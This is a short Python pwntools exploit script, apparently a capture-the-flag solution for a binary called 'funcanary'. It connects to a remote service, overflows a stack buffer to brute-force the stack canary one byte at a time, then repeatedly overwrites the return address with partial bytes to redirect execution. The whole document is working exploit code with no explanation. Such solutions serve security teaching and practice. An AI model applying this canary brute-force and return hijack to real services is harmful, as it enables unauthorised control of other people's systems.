from pwn import *
import time
# context.log_level = 'debug'
# p=process('./funcanary')
p=remote('47.94.206.10',20071)
# elf=ELF('./funcanary')
context.arch='amd64'
timeout=0.25
canary=b'\x00'
def test(mybyte):
    # print('in',mybyte)
    p.recvuntil(b'welcome\n')
    payload=b'a'*0x68+canary+mybyte
    # gdb.attach(p,'b *$rebase(0x00000000000012B6)')
    # pause()
    p.send(payload)
    recv=p.recvuntil(b'have fun\n',timeout=timeout)
    if b'have fun\n' in recv:
        return True
    else:
        return False
# back=0x0000000000001228
num=0
while 1:
    for i in range(0x100):
        if test(p8(i)):
            canary+=p8(i)
            num+=1
            print('add',hex(i))
            break
    if num==7:
        break
print('canary',hex(u64(canary)))
context.log_level = 'debug'
while 1:
    i=random.randint(0, 14)
    payload=b'a'*0x68+canary+p64(0x7fffffffdde0)+p8(0x31)+p8(0x12+i*16)
    p.recvuntil(b'welcome\n')
    p.send(payload)
# p.recvuntil(b'welcome\n')
# payload=b'a'*0x68+canary+p64(0x0000000000400D83)